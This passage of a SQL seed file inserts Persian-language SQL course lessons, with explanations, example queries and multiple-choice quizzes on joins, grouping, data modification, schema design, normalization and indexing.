قرینه LEFT است و عملاً هیچ‌وقت لازم نمی‌شود؛ FULL OUTER هم که همه‌چیز را نگه می‌دارد، برای مغایرت‌گیری دو جدول است."},{"k":"h","t":"ترتیب نوشتن، ترتیب اجرا نیست"},{"k":"p","t":"SQL را از بالا می‌خوانی ولی موتور از جای دیگری اجرا می‌کند: اول FROM و JOIN (ساخت جدول کاری)، بعد WHERE (فیلتر ردیف‌ها)، سپس GROUP BY و توابع تجمیعی، بعد HAVING (فیلتر گروه‌ها)، بعد SELECT (انتخاب ستون‌ها) و آخر ORDER BY و LIMIT. حالا دو قانون گیج‌کننده را می‌فهمی: چرا نمی‌توانی در WHERE از مستعار SELECT استفاده کنی (چون WHERE قبل از SELECT اجرا شده) و چرا شرط روی COUNT باید در HAVING باشد نه WHERE (چون گروه‌ها بعد از WHERE ساخته می‌شوند). و یک نکته کارایی: شرط فیلترِ ستون‌های خودِ جدول را در WHERE بگذار، نه در ON — برای INNER نتیجه یکی است ولی خوانا‌تر و بهینه‌تر است."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"sql","title":"سه JOIN کلاسیک با یک سوال واقعی","code":"-- ۱) هر سفارش با نام مشتری‌اش (INNER: فقط منطبق‌ها)\nSELECT o.id, c.name, o.total\nFROM orders o\nJOIN customers c ON c.id = o.customer_id;\n\n-- ۲) همه مشتریان + تعداد سفارش (حتی صفر)\nSELECT c.name, COUNT(o.id) AS orders\nFROM customers c\nLEFT JOIN orders o ON o.customer_id = c.id\nGROUP BY c.name;\n\n-- ۳) مشتری‌های بی‌سفارش — الگوی گمشده‌ها\nSELECT c.name\nFROM customers c\nLEFT JOIN orders o ON o.customer_id = c.id\nWHERE o.id IS NULL;   -- NULL یعنی جفتی نبود"},{"k":"h","t":"جدول مرجع"},{"k":"table","head":["JOIN","نگه می‌دارد","کاربرد"],"rows":[["INNER","فقط جفت‌های منطبق","ترکیب داده مرتبط"],["LEFT","همه چپ + NULL برای نمنطبق","«همه Xها حتی بدون Y»، پیدا کردن گمشده‌ها"],["FULL OUTER","همه هر دو طرف","مغایرت‌گیری دو جدول"],["CROSS","ضرب دکارتی همه در همه","تولید ترکیب‌ها (با احتیاط!)"]]},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["INNER JOIN فقط ردیف‌های دارای تطابق در هر دو","LEFT JOIN همه چپ + تطابق‌های راست (یا NULL)","همیشه نام جدول بده: orders.user_id = users.id"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"sql","title":"join.sql","code":"-- سفارش‌های هر کاربر با نامش:\nSELECT u.name, o.total\nFROM users u\nJOIN orders o ON o.user_id = u.id;\n\n-- همه کاربران حتی بدون سفارش:\nSELECT u.name, COUNT(o.id) AS orders\nFROM users u\nLEFT JOIN orders o ON o.user_id = u.id\nGROUP BY u.id, u.name;"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: INNER JOIN فقط ردیف‌های دارای تطابق در هر دو بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"تفاوت INNER و LEFT JOIN چیست؟","opts":["سرعت","INNER فقط مشترک‌ها؛ LEFT همه ردیف‌های جدول چپ را حتی بدون تطابق نگه می‌دارد","هیچ","جهت جدول"],"ans":1,"why":"در LEFT JOIN ردیف‌های چپ که تطابق ندارند هم می‌مانند و ستون‌های راستشان NULL می‌شود."},{"q":"برای «همه مشتریان و تعداد سفارش‌شان، حتی صفر» کدام؟","opts":["INNER JOIN","LEFT JOIN از customers به orders — مشتریان بی‌سفارش با COUNT صفر می‌مانند","RIGHT JOIN به orders","دو query جدا"],"ans":1,"why":"INNER مشتریان بی‌سفارش را حذف می‌کند چون جفتی ندارند؛ LEFT همه ردیف‌های چپ را نگه می‌دارد و COUNT روی NULLها صفر می‌شود."},{"q":"چرا شرط روی SUM باید در HAVING باشد نه WHERE؟","opts":["سلیقه","چون WHERE قبل از GROUP BY اجرا می‌شود و هنوز گروهی ساخته نشده — HAVING فیلترِ بعد از گروه‌بندی است","کندتر است","فرقی ندارند"],"ans":1,"why":"ترتیب اجرا: WHERE ردیف‌ها را قبل از گروه‌بندی فیلتر می‌کند؛ تجمیع بعد از آن ساخته می‌شود و فقط HAVING می‌تواند رویش شرط بگذارد."}]'::jsonb),
('sql-b3', 'sql', 'GROUP BY و توابع تجمیعی', 63, 8, '[{"k":"p","t":"GROUP BY ردیف‌ها را دسته‌بندی و توابع تجمیعی مثل COUNT و SUM را روی هر دسته اعمال می‌کند؛ HAVING فیلترِ بعد از گروه‌بندی است."},{"k":"h","t":"GROUP BY؛ کوچک‌کردن ردیف‌ها به گروه‌ها"},{"k":"p","t":"GROUP BY جدول را بر اساس ستون‌های مشخص دسته‌بندی می‌کند و از هر دسته یک ردیف بیرون می‌آید — پس ستون‌های SELECT یا باید در GROUP BY باشند یا داخل یک تابع تجمیعی (SUM، COUNT، AVG، MAX، MIN). این قاعده «فقط گروه یا تجمیع» دلیل خطای معروف «column must appear in GROUP BY» است. دو ظرافت: COUNT(*) تعداد ردیف‌هاست ولی COUNT(column) تعداد غیرNULLها — پس COUNT(o.id) برای مشتری بی‌سفارش صفر می‌شود چون NULL است، نه یک. و میانگین‌گیری از میانگین‌ها اشتباه کلاسیک است: AVG هر گروه وزن برابر می‌گیرد؛ اگر اندازه گروه‌ها متفاوت باشد، باید SUM کل را بر COUNT کل تقسیم کنی."},{"k":"h","t":"HAVING در برابر WHERE؛ دو فیلتر برای دو مرحله"},{"k":"p","t":"این دو را با ترتیب اجرا به خاطر بسپار: WHERE قبل از گروه‌بندی، ردیف‌های خام را فیلتر می‌کند («فقط سفارش‌های امسال را در نظر بگیر»)؛ HAVING بعد از گروه‌بندی، خودِ گروه‌ها را فیلتر می‌کند («گروه‌هایی که مجموعشان بالای ۱۰ میلیون است»). پس «مجموع خرید مشتریان تهرانی که بیش از ۳ سفارش دارند» می‌شود: WHERE city = ''تهران'' (فیلتر ردیف) + GROUP BY customer + HAVING COUNT(*) > 3 (فیلتر گروه). و دو ابزار مدرن که GROUP BY را قدرتمند می‌کنند: ROLLUP برای جمع کل در انتهای گزارش، و window functionها (SUM() OVER) برای تجمیع بدون کوچک‌کردن ردیف‌ها — وقتی می‌خواهی کنار هر سفارش، مجموع مشتری‌اش را هم ببینی."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"sql","title":"گزارش فروش؛ از ساده تا پنجره‌ای","code":"-- مجموع و تعداد خرید هر مشتری، فقط پرخریدها\nSELECT c.name,\n       COUNT(o.id)  AS orders,\n       SUM(o.total) AS revenue\nFROM customers c\nJOIN orders o ON o.customer_id = c.id\nWHERE o.created_at >= ''2026-01-01''      -- فیلتر ردیف: امسال\nGROUP BY c.name\nHAVING SUM(o.total) > 10000000          -- فیلتر گروه: پرخرید\nORDER BY revenue DESC;\n\n-- کنار هر سفارش، مجموع مشتری‌اش (بدون GROUP BY)\nSELECT o.id, o.total,\n       SUM(o.total) OVER (PARTITION BY o.customer_id) AS customer_sum\nFROM orders o;"},{"k":"warn","title":"دام رایج","t":"AVG(avg_column) روی میانگین‌های گروهی، میانگین واقعی نیست اگر گروه‌ها هم‌اندازه نباشند — هر گروه وزن برابر می‌گیرد. میانگین واقعی = SUM(x) / COUNT(x) روی کل داده."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["هر ستون غیرتجمیعی در SELECT باید در GROUP BY باشد","WHERE قبل از گروه‌بندی، HAVING بعد از آن فیلتر می‌کند","COUNT(*) تعداد ردیف و SUM جمع مقدار"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"sql","title":"group.sql","code":"SELECT category, COUNT(*) AS n, AVG(price) AS avg_p\nFROM products\nGROUP BY category\nHAVING COUNT(*) > 5\nORDER BY avg_p DESC;"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: هر ستون غیرتجمیعی در SELECT باید در GROUP BY باشد بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"تفاوت WHERE و HAVING چیست؟","opts":["هیچ","WHERE قبل از گروه‌بندی ردیف فیلتر می‌کند؛ HAVING بعد از GROUP BY روی دسته‌ها","سینتکس","سرعت"],"ans":1,"why":"WHERE نمی‌تواند روی نتیجه تجمیع فیلتر کند چون قبل از گروه‌بندی اجرا می‌شود؛ HAVING برای شرط روی دسته‌هاست."},{"q":"چرا SELECT city, AVG(salary) بدون GROUP BY city خطا می‌دهد؟","opts":["باگ","چون بعد از تجمیع، یک ردیف باقی می‌ماند و cityِ ده‌ها ردیف مبهم است — باید گروه‌بندی شود یا MAX(city) باشد","نوع اشتباه","AVG اشتباه است"],"ans":1,"why":"تجمیع، ردیف‌ها را آب می‌کند؛ ستون‌های غیرتجمیعی معلوم نیست کدام ردیف را نشان دهند. دیتابیس‌های سخت‌گیر (Postgres) خطا می‌دهند تا باگ منطقی را لو بدهند."},{"q":"تفاوت COUNT(*) و COUNT(column) چیست؟","opts":["فرقی ندارند","COUNT(*) ردیف‌ها را می‌شمارد؛ COUNT(column) فقط غیرNULLها را — برای مشتری بی‌سفارش، دومی صفر است","دومی سریع‌تر","اولی قدیمی"],"ans":1,"why":"NULL «نداشتن» است؛ شمارش ستون آن را رد می‌کند. در LEFT JOIN همین تفاوت است که «صفر سفارش» را از «یک سفارش» جدا می‌کند."}]'::jsonb),
('sql-b4', 'sql', 'INSERT، UPDATE و DELETE', 63, 9, '[{"k":"p","t":"این سه فرمان داده را تغییر می‌دهند؛ مهم‌ترین اصل: UPDATE و DELETE را همیشه اول با WHERE دقیق تست کن و هیچ‌وقت بدون WHERE ننویس."},{"k":"h","t":"نوشتن‌ها جدی‌اند؛ آناتومی یک تغییر امن"},{"k":"p","t":"SELECT اشتباه حداکثر نتیجه اشتباه می‌دهد؛ UPDATE/DELETE اشتباه داده را از بین می‌برد — و تفاوت حرفه‌ای‌ها دقیقاً همین‌جاست. سه قاعده آهنین: اول، هر UPDATE و DELETE حتماً WHERE دارد — UPDATE users SET active = false بدون WHERE یعنی همه کاربران غیرفعال! قبل از اجرای هر حذف/به‌روزرسانی سنگین، همان query را با SELECT اجرا کن و ببین دقیقاً کدام ردیف‌ها هدف‌اند. دوم، UPDATE/DELETE را با SELECT شروع و تعداد را تأیید کن. سوم، در معاملات مالی از transaction استفاده کن (BEGIN ... COMMIT/ROLLBACK) تا یا همه تغییرات اعمال شود یا هیچ‌کدام — «نیمی از انتقالات پول» بدتر از هیچ است."},{"k":"h","t":"UPSERT؛ وقتی «بساز یا به‌روز کن» یک عمل است"},{"k":"p","t":"خیلی از نوشتن‌ها دو حالته‌اند: اگر رکورد هست به‌روزش کن، اگر نیست بساز — مثل شمارنده بازدید یا موجودی. الگوی خام (SELECT بعد INSERT/UPDATE) هم race condition دارد و هم دو round-trip. راه‌حل‌ها به بلوغ رسیده‌اند: در Postgres از ON CONFLICT DO UPDATE استفاده می‌کنی — یک اتمی: INSERT ... ON CONFLICT (user_id) DO UPDATE SET visits = users.visits + 1. در MySQL معادلش ON DUPLICATE KEY UPDATE است. این الگو قلب بسیاری از سیستم‌هاست: جمع‌آوری متریک، سینک داده از API بیرونی، و Rate Limiting — هرجا «آخرین وضعیت مهم است، نه تاریخچه»."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"sql","title":"انتقال پول؛ همه یا هیچ","code":"BEGIN;                                    -- شروع تراکنش\n\nUPDATE accounts SET balance = balance - 500000\nWHERE id = 1 AND balance >= 500000;       -- شرط کف موجودی!\n\nUPDATE accounts SET balance = balance + 500000\nWHERE id = 2;\n\n-- اگر اولین UPDATE صفر ردیف گرفت (موجودی کم)،\n-- کل تراکنش را برگردان:\n-- ROLLBACK;   وگرنی  COMMIT;\n\n-- UPSERT: شمارنده بازدید اتمی\nINSERT INTO stats (user_id, visits) VALUES (42, 1)\nON CONFLICT (user_id)\nDO UPDATE SET visits = stats.visits + 1;"},{"k":"warn","title":"دام رایج","t":"UPDATE users SET x = 1 بدون WHERE همه جدول را عوض می‌کند — و در بسیاری تنظیمات، برگشتی جز بک‌آپ ندارد. قبل از هر نوشتنِ سنگین، همان شرط را SELECT بگیر و تعداد را ببین؛ و در production همیشه بک‌آپ قبل از migration."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["INSERT INTO t (a,b) VALUES (1,2) درج می‌کند","UPDATE بدون WHERE همه ردیف‌ها را عوض می‌کند!","در تراکنش بنویس تا قابل بازگشت باشد"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"sql","title":"dml.sql","code":"BEGIN;\nUPDATE products SET price = price * 1.1\nWHERE category = ''برق'';\n-- اگر اشتباه بود:\nROLLBACK;\n-- اگر درست بود:\nCOMMIT;"},{"k":"warn","title":"هشدار","t":"UPDATE products SET price=0 بدون WHERE کل جدول را صفر می‌کند — همیشه اول با SELECT همان WHERE تعداد ردیف‌های موثر را چک کن."},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: INSERT INTO t (a,b) VALUES (1,2) درج می‌کند بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"چرا UPDATE/DELETE بدون WHERE خطرناک است؟","opts":["کند است","چون روی همه ردیف‌های جدول اعمال می‌شود و می‌تواند کل داده را خراب کند","خطا می‌دهد","اجرا نمی‌شود"],"ans":1,"why":"بدون WHERE شرطی نیست که ردیف‌ها را محدود کند؛ فرمان به تک‌تک ردیف‌ها اعمال می‌شود."},{"q":"چرا UPDATE بدون WHERE فاجعه است؟","opts":["کند است","چون روی همه ردیف‌های جدول اعمال می‌شود — و برخلاف SELECT اشتباه، داده واقعاً تغییر می‌کند","خطا می‌دهد","هیچ"],"ans":1,"why":"WHERE محدوده اثر است؛ بدونش «همه» محدوده است. عادت حرفه‌ای: اول SELECT با همان WHERE برای شمارش هدف‌ها، بعد نوشتن."},{"q":"ON CONFLICT DO UPDATE چه مشکلی را حل می‌کند؟","opts":["سرعت SELECT","عمل «بساز یا به‌روز کن» را اتمی و تک‌دستور می‌کند — بدون race conditionِ الگوی SELECT-سپس-INSERT","اینکس می‌سازد","حذف می‌کند"],"ans":1,"why":"در الگوی دستی، بین SELECT و INSERT کاربر دیگری می‌تواند رکورد بسازد و تکراری شود؛ UPSERT در یک عمل اتمی، هر دو حالت را پوشش می‌دهد."}]'::jsonb),
('sql-b5', 'sql', 'طراحی اسکیما و کلید', 56, 10, '[{"k":"p","t":"طراحی خوب اسکیما با کلید اولیه برای یکتایی، کلید خارجی برای رابطه و تایپ درست برای هر ستون شروع می‌شود؛ اینجا کیفیت داده متولد می‌شود."},{"k":"h","t":"اسکیما؛ نقشه‌ی داده‌ی تو"},{"k":"p","t":"قبل از نوشتن حتی یک query، باید ساختار جدول‌ها (اسکیما) را درست طراحی کنی؛ چون کیفیت اسکیما، کیفیت همه queryها و سلامت داده را تعیین می‌کند. هر جدول باید یک موضوع واحد را مدل کند و هر ستون یک واقعیت درباره آن. سه تصمیم کلیدی: کلید اولیه برای یکتایی هر ردیف، کلید خارجی برای رابطه با جدول دیگر، و تایپ درست برای هر ستون — چون تایپ اشتباه (مثل ذخیره عدد در رشته) هم فضا هدر می‌دهد هم اعتبارسنجی و مقایسه را خراب می‌کند."},{"k":"h","t":"کلید اولیه و خارجی؛ ستون‌های رابطه"},{"k":"p","t":"کلید اولیه (Primary Key) ستونی است که هر ردیف را یکتا می‌شناسد و هیچ‌وقت null یا تکراری نیست — معمولاً یک id عددی خودکار یا UUID. کلید خارجی (Foreign Key) ستونی است که به کلید اولیه جدول دیگر اشاره می‌کند و رابطه را می‌سازد؛ دیتابیس با آن تضمین می‌کند که مثلاً «سفارشی به مشتری‌ای که وجود ندارد» وصل نشود (ارجاع‌دهی یکپارچه). طراحی خوب یعنی واقعیت‌ها را درست به جدول‌ها و رابطه‌ها بشکنی، نه اینکه همه‌چیز را در یک جدول بزرگ بریزی."},{"k":"h","t":"جدول مرجع"},{"k":"table","head":["","کلید اولیه","کلید خارجی"],"rows":[["نقش","شناسایی یکتای ردیف","اشاره به ردیف جدول دیگر"],["null / تکراری","هیچ‌وقت","می‌تواند null باشد (رابطه اختیاری)"],["تضمین دیتابیس","یکتایی","ارجاع‌دهی یکپارچه"]]},{"k":"warn","title":"دام رایج","t":"از داده‌های طبیعی و تغییرپذیر (مثل ایمیل یا شماره ملی) به‌عنوان کلید اولیه استفاده نکن؛ چون اگر کاربر ایمیلش را عوض کند، همه ارجاع‌ها به‌هم می‌ریزد. یک id مصنوعی پایدار بساز و ایمیل را فقط یک ستون یکتا (UNIQUE) نگه دار."},{"k":"tip","title":"نکته منتور","t":"برای ستون‌های عددیِ پول و مقدار، از تایپ اعشاری دقیق (مثل NUMERIC/DECIMAL) استفاده کن نه FLOAT؛ چون float خطای گردکردن دارد و در پول، ۰.۰۰۰۰۰۱ تومان اختلاف هم بعد از هزار تراکنش به یک مشکل واقعی تبدیل می‌شود."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["PRIMARY KEY یکتا و غیرNULL است","FOREIGN KEY ارجاع به ردیف معتبر جدول دیگر را تضمین می‌کند","برای شناسه از SERIAL/BIGINT و برای متن از طول مناسب"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"sql","title":"schema.sql","code":"CREATE TABLE users (\n  id SERIAL PRIMARY KEY,\n  email TEXT UNIQUE NOT NULL,\n  created_at TIMESTAMPTZ DEFAULT now()\n);\n\nCREATE TABLE orders (\n  id SERIAL PRIMARY KEY,\n  user_id INT NOT NULL REFERENCES users(id),\n  total NUMERIC(10,2)\n);"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: PRIMARY KEY یکتا و غیرNULL است بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"نقش FOREIGN KEY چیست؟","opts":["سرعت","تضمین می‌کند مقدار به یک ردیف موجود در جدول دیگر اشاره کند و رابطه سالم بماند","رمزنگاری","مرتب‌سازی"],"ans":1,"why":"FOREIGN KEY از ردیف‌های یتیم جلوگیری می‌کند؛ نمی‌توانی سفارشی با user_id ناموجود بسازی."},{"q":"کلید خارجی چه تضمینی ایجاد می‌کند؟","opts":["سرعت","ارجاع‌دهی یکپارچه؛ اینکه یک ردیف نتواند به ردیفی که وجود ندارد اشاره کند","فشرده‌سازی","رمزنگاری"],"ans":1,"why":"با کلید خارجی، دیتابیس جلوی ایجاد رابطه با ردیف ناموجود را می‌گیرد (مثلاً سفارش برای مشتری‌ای که نیست) و هنگام حذف هم رفتار مشخصی (مثل CASCADE یا جلوگیری) دارد، پس داده همیشه سازگار می‌ماند."},{"q":"چرا نباید ایمیل را کلید اولیه کرد؟","opts":["کند است","چون تغییرپذیر است؛ اگر کاربر ایمیلش را عوض کند همه ارجاع‌ها به‌هم می‌ریزد؛ id پایدار بهتر است","زیاد است","ممکن نیست"],"ans":1,"why":"کلید اولیه باید پایدار باشد چون بقیه جدول‌ها با آن ارجاع می‌دهند؛ ایمیل می‌تواند عوض شود، پس یک id مصنوعی که هرگز تغییر نمی‌کند انتخاب امن‌تری است."}]'::jsonb),
('sql-b6', 'sql', 'نرمال‌سازی و فرم‌های نرمال', 56, 11, '[{"k":"p","t":"نرمال‌سازی تکرار داده را با تقسیم جدول حذف می‌کند؛ تا فرم سوم، هر واقعیت فقط یک‌جا ذخیره می‌شود و ناهنجاری به‌روزرسانی از بین می‌رود."},{"k":"h","t":"نرمال‌سازی؛ حذف تکرار با تقسیم جدول"},{"k":"p","t":"اگر همه داده را در یک جدول بزرگ بریزی، اطلاعات تکرار می‌شوند و با هر تغییر باید ده‌جا را به‌روز کنی — و اگر یکی جا بیفتد، داده ناسازگار می‌شود. نرمال‌سازی فرایند شکستن جدول به جدول‌های کوچک‌تر و مرتبط است تا هر «واقعیت» فقط یک‌جا ذخیره شود. مثلاً به‌جای ذخیره نام مشتری در هر سفارش، یک جدول مشتریان می‌سازی و سفارش فقط به آن ارجاع می‌دهد؛ آن‌وقت تغییر نام مشتری یک به‌روزرسانی است، نه هزارتا."},{"k":"h","t":"فرم‌های نرمال و کی متوقف شوی"},{"k":"p","t":"فرم‌های نرمال مراحل تدریجی‌اند: فرم اول (حذف گروه‌های تکراری)، دوم (وابستگی کامل به کل کلید) و سوم (حذف وابستگی به غیرکلید — یعنی هیچ ستونی از ستون غیرکلیدیِ دیگری مشتق نشود). تا فرم سوم معمولاً نقطه درست برای اکثر سیستم‌هاست. ولی نرمال‌سازی افراطی هم هزینه دارد: هرچه جدول‌ها بیشتر، JOIN بیشتر و query پیچیده‌تر. پس گاهی برای سرعت خواندن، عمداً کمی تکرار برمی‌گردانی (denormalization) — ولی آگاهانه و فقط وقتی واقعاً لازم شده."},{"k":"h","t":"جدول مرجع"},{"k":"table","head":["فرم نرمال","حذف می‌کند","مثال نقض"],"rows":[["اول","گروه‌ها و آرایه‌های تکراری در یک ستون","چند تلفن در یک فیلد"],["دوم","وابستگی به فقط بخشی از کلید","در (سفارش، کالا)، نام کالا که فقط به کالا وابسته است"],["سوم","وابستگی به ستون غیرکلیدی","کد پستی که از شهر قابل‌استنتاج است"]]},{"k":"warn","title":"دام رایج","t":"نرمال‌سازی را به‌صورت کورکورانه تا آخرین فرم نبر؛ هدف حذف ناهنجاری به‌روزرسانی است، نه ساختن بیشترین تعداد جدول. اگر یک الگوی خواندن پرتکرار داری که نیاز به JOINهای زیاد پیدا کرده، denormalization کنترل‌شده می‌تواند انتخاب مهندسی درستی باشد."},{"k":"tip","title":"نکته منتور","t":"یک آزمون ساده برای فرم سوم بپرس: «آیا این ستون واقعاً درباره خودِ این ردیف است یا درباره چیز دیگری؟» اگر نام شهر را کنار کد پستی در جدول آدرس داری، شهر درباره کد پستی است نه درباره آدرس — پس باید جدا شود."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["فرم اول: ستون‌های اتمی و بدون گروه تکراری","فرم دوم: وابستگی کامل به کل کلید اولیه","فرم سوم: بدون وابستگی به ستون غیرکلید"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"sql","title":"normalize.sql","code":"-- غیرنرمال: نام مشتری در هر سفارش تکرار\n-- orders(id, customer_name, total)\n\n-- نرمال: مشتری یک‌جا، سفارش ارجاع\n-- customers(id, name)\n-- orders(id, customer_id, total)"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: فرم اول: ستون‌های اتمی و بدون گروه تکراری بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"مشکل اصلی ذخیره نام مشتری در جدول سفارش چیست؟","opts":["کند است","تکرار و ناهنجاری: تغییر نام باید در همه سفارش‌های آن مشتری اعمال شود","جا می‌گیرد","ممکن نیست"],"ans":1,"why":"اگر نام در هزار سفارش تکرار شده، یک تغییر نام باید هزار ردیف را به‌روز کند و ممکن است ناسازگار شود."},{"q":"نرمال‌سازی چه مشکلی را حل می‌کند؟","opts":["کندی","تکرار داده و ناهنجاری به‌روزرسانی؛ با ذخیره هر واقعیت فقط در یک‌جا","امنیت","حجم"],"ans":1,"why":"وقتی یک واقعیت (مثل نام مشتری) در چند ردیف تکرار شده، تغییرش نیاز به چند به‌روزرسانی دارد و اگر یکی جا بیفتد داده ناسازگار می‌شود؛ نرمال‌سازی با تقسیم جدول، هر واقعیت را یک‌جا نگه می‌دارد."},{"q":"denormalization چیست و چه‌وقت انجام می‌شود؟","opts":["حذف جدول‌ها","عمداً کمی تکرار برگرداندن برای سرعت خواندن، آگاهانه و فقط وقتی JOINهای زیاد واقعاً کند شده‌اند","همیشه اشتباه است","نرمال‌سازی بیشتر"],"ans":1,"why":"هرچه جدول‌ها نرمال‌تر، queryها JOIN بیشتری لازم دارند؛ اگر یک الگوی خواندن خیلی پرتکرار کند شده، تکرار کنترل‌شده برخی داده‌ها می‌تواند آن را سریع کند — به قیمت کمی پیچیدگی به‌روزرسانی."}]'::jsonb),
('sql-b7', 'sql', 'ایندکس و سرعت پرس‌وجو', 56, 12, '[{"k":"p","t":"ایندکس ساختار مرتبی است که جست‌وجو را از اسکن کامل O(n) به O(log n) می‌رساند؛ ولی هر ایندکس نوشتن را کمی کندتر می‌کند."},{"k":"h","t":"ایندکس؛ میان‌بر جست‌وجو"},{"k":"p","t":"بدون ایندکس، برای پیدا کردن ردیف‌های مطابق یک شرط، دیتابیس مجبور است تک‌تک ردیف‌های جدول را بخواند (اسکن کامل) — برای میلیون‌ها ردیف این فاجعه است. ایندکس یک ساختار جدا و مرتب (معمولاً B-tree) از یک یا چند ستون است که جست‌وجو را به O(log n) می‌رساند؛ یعنی دیتابیس مستقیم به محدوده موردنظر می‌پرد به‌جای گشتن در همه. پس برای ستون‌هایی که زیاد در WHERE، JOIN و ORDER BY می‌آیند، ایندکس تفاوت بین میلی‌ثانیه و چند ثانیه است."},{"k":"h","t":"ایندکس رایگان نیست؛ کجا و چقدر"},{"k":"p","t":"هر ایندکس هزینه دارد: فضا می‌گیرد و مهم‌تر، هر INSERT و UPDATE و DELETE باید ایندکس را هم به‌روز نگه دارد، پس نوشتن کمی کندتر می‌شود. پس نه «هیچ ایندکس» درست است نه «ایندکس روی همه‌چیز». قانون: ستون‌های پرجست‌وجو و کم‌تغییر را ایندکس کن، ستون‌های کم‌جست‌وجو یا خیلی پرتغییر را نه. و حتماً با EXPLAIN بررسی کن که دیتابیس واقعاً از ایندکس استفاده می‌کند؛ گاهی ایندکس هست ولی به‌خاطر Selectivity پایین (مثلاً ستونی که ۹۰٪ مقدارش یکی است) دیتابیس ترجیح می‌دهد اسکن کامل کند."},{"k":"h","t":"جدول مرجع"},{"k":"table","head":["","بدون ایندکس","با ایندکس"],"rows":[["جست‌وجو","اسکن کامل O(n)","B-tree با O(log n)"],["نوشتن","سریع‌تر","کمی کندتر (به‌روزرسانی ایندکس)"],["فضا","کمتر","فضای اضافه برای ایندکس"]]},{"k":"warn","title":"دام رایج","t":"ایندکس ساختن و رهاکردن کافی نیست؛ گاهی ایندکس می‌سازی ولی query از آن استفاده نمی‌کند (مثلاً تابع روی ستون زده‌ای یا Selectivity پایین است). همیشه با EXPLAIN ببین پلن اجرا واقعاً ایندکس را برداشته، وگرنه فقط هزینه نوشتن را پرداخته‌ای بدون سود خواندن."},{"k":"tip","title":"نکته منتور","t":"برای ستون‌هایی که با هم جست‌وجو می‌شوند، یک ایندکس مرکب (چندستونه) بساز به‌جای چند ایندکس جدا؛ ولی ترتیب ستون‌ها مهم است — ستونی که همیشه در شرط می‌آید اول، و ایندکس مرکب برای جست‌وجوی ستون اول به‌تنهایی هم کار می‌کند ولی برعکسش نه."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["روی ستون‌های WHERE و JOIN ایندکس بزن","ایندکس زیاد، INSERT/UPDATE را کند می‌کند","با EXPLAIN ببین آیا ایندکس واقعاً استفاده شد"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"sql","title":"index.sql","code":"CREATE INDEX idx_orders_user ON orders(user_id);\n\nEXPLAIN ANALYZE\nSELECT * FROM orders WHERE user_id = 42;\n-- دنبال ''Index Scan'' باش نه ''Seq Scan''"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: روی ستون‌های WHERE و JOIN ایندکس بزن بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"چرا ایندکس، نوشتن را کندتر می‌کند؟","opts":["قفل می‌گذارد","چون با هر INSERT/UPDATE ساختار ایندکس هم باید به‌روز بماند","رمزنگاری می‌کند","نمی‌کند"],"ans":1,"why":"ایندکس یک کپی مرتب از ستون است؛ تغییر داده یعنی حفظ ترتیب آن کپی هم."},{"q":"ایندکس چطور جست‌وجو را سریع می‌کند؟","opts":["کش می‌کند","با یک ساختار مرتب (B-tree) که جست‌وجو را از اسکن کامل O(n) به O(log n) می‌رساند","فشرده می‌کند","موازی می‌کند"],"ans":1,"why":"B-tree مثل درخت جست‌وجو، در هر گام بخش بزرگی از داده را حذف می‌کند؛ پس برای میلیون‌ها ردیف، به‌جای خواندن همه، فقط چند گره پیموده می‌شود تا محدوده موردنظر پیدا شود."},{"q":"چرا ایندکس نوشتن را کند می‌کند و چه نتیجه‌ای دارد؟","opts":["کند نمی‌کند","چون هر INSERT/UPDATE/DELETE باید ایندکس را هم به‌روز نگه دارد؛ پس فقط ستون‌های پرجست‌وجو و کم‌تغییر را ایندکس کن","فضا می‌گیرد","امنیت"],"ans":1,"why":"ایندکس یک کپی مرتب است که باید با داده همگام بماند؛ پس هر نوشتن کار اضافه دارد. اگر ستونی بندرت جست‌وجو ولی مدام عوض می‌شود، ایندکسش بیشتر ضرر است تا سود."}]'::jsonb)
INSERT INTO lessons (id, course_id, title, minutes, sort_order, blocks, quiz) VALUES
